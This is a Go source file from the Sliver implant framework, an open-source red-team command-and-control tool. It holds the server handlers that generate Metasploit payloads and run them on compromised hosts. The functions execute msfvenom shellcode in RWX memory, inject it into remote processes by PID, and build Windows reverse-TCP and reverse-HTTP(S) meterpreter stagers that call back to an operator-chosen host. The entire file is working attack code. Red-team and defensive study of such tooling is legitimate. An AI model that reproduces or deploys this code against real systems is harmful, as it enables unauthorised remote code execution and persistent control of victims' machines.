package rpc

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"errors"
	"fmt"
	"math/rand"
	"path"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/codenames"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/db"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/msf"
)

var (
	msfLog = log.NamedLogger("rcp", "msf")
)

// Msf - Helper function to execute MSF payloads on the remote system
func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*sliverpb.Task, error) {
	var os string
	var arch string
	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return nil, err
	}
	taskReq := &sliverpb.TaskReq{
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// MsfRemote - Inject an MSF payload into a remote process
func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*sliverpb.Task, error) {
	var os string
	var arch string
	if !req.Request.Async {
		session := core.Sessions.Get(req.Request.SessionID)
		if session == nil {
			return nil, ErrInvalidSessionID
		}
		os = session.OS
		arch = session.Arch
	} else {
		beacon, err := db.BeaconByID(req.Request.BeaconID)
		if err != nil {
			msfLog.Errorf("%s\n", err)
			return nil, ErrDatabaseFailure
		}
		if beacon == nil {
			return nil, ErrInvalidBeaconID
		}
		os = beacon.OS
		arch = beacon.Arch
	}

	rawPayload, err := msf.VenomPayload(msf.VenomConfig{
		Os:         os,
		Arch:       msf.Arch(arch),
		Payload:    req.Payload,
		LHost:      req.LHost,
		LPort:      uint16(req.LPort),
		Encoder:    req.Encoder,
		Iterations: int(req.Iterations),
		Format:     "raw",
	})
	if err != nil {
		return nil, err
	}
	taskReq := &sliverpb.TaskReq{
		Pid:      req.PID,
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
		Request:  req.Request,
	}
	resp := &sliverpb.Task{Response: &commonpb.Response{}}
	err = rpc.GenericHandler(taskReq, resp)
	if err != nil {
		return nil, err
	}
	return resp, nil
}

// MsfStage - Generate a MSF compatible stage
func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*clientpb.MsfStager, error) {
	var (
		MSFStage = &clientpb.MsfStager{
			File: &commonpb.File{},
		}
		payload string
		arch    string
		uri     string
	)

	switch req.GetArch() {
	case "amd64":
		arch = "x64"
	default:
		arch = "x86"
	}

	switch req.Protocol {
	case clientpb.StageProtocol_TCP:
		payload = "meterpreter/reverse_tcp"
	case clientpb.StageProtocol_HTTP:
		payload = "custom/reverse_winhttp"
		uri = generateCallbackURI()
	case clientpb.StageProtocol_HTTPS:
		payload = "custom/reverse_winhttps"
		uri = generateCallbackURI()
	default:
		return MSFStage, errors.New("protocol not supported")
	}

	// We only support windows at the moment
	if req.GetOS() != "windows" {
		return MSFStage, fmt.Errorf("%s is currently not supported", req.GetOS())
	}

	venomConfig := msf.VenomConfig{
		Os:       req.GetOS(),
		Payload:  payload,
		LHost:    req.GetHost(),
		LPort:    uint16(req.GetPort()),
		Arch:     arch,
		Format:   req.GetFormat(),
		BadChars: req.GetBadChars(), // TODO: make this configurable
		Luri:     uri,
	}

	stage, err := msf.VenomPayload(venomConfig)
	if err != nil {
		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
		return MSFStage, err
	}
	MSFStage.File.Data = stage
	name, err := codenames.GetCodename()
	if err != nil {
		return MSFStage, err
	}
	MSFStage.File.Name = name
	return MSFStage, nil
}

// Utility functions
func generateCallbackURI() string {
	currentHTTPC2Config := configs.GetHTTPC2Config()
	segments := currentHTTPC2Config.ImplantConfig.StagerPaths
	fileNames := []string{}
	for _, fileName := range currentHTTPC2Config.ImplantConfig.StagerFiles {
		fileNames = append(fileNames, fileName+"."+currentHTTPC2Config.ImplantConfig.StagerFileExt)
	}

	return path.Join(randomPath(segments, fileNames)...)
}

func randomPath(segments []string, filenames []string) []string {
	seed := rand.NewSource(time.Now().UnixNano())
	insecureRand := rand.New(seed)
	n := insecureRand.Intn(3) // How many segments?
	genSegments := []string{}
	for index := 0; index < n; index++ {
		seg := segments[insecureRand.Intn(len(segments))]
		genSegments = append(genSegments, seg)
	}
	filename := filenames[insecureRand.Intn(len(filenames))]
	genSegments = append(genSegments, filename)
	return genSegments
}
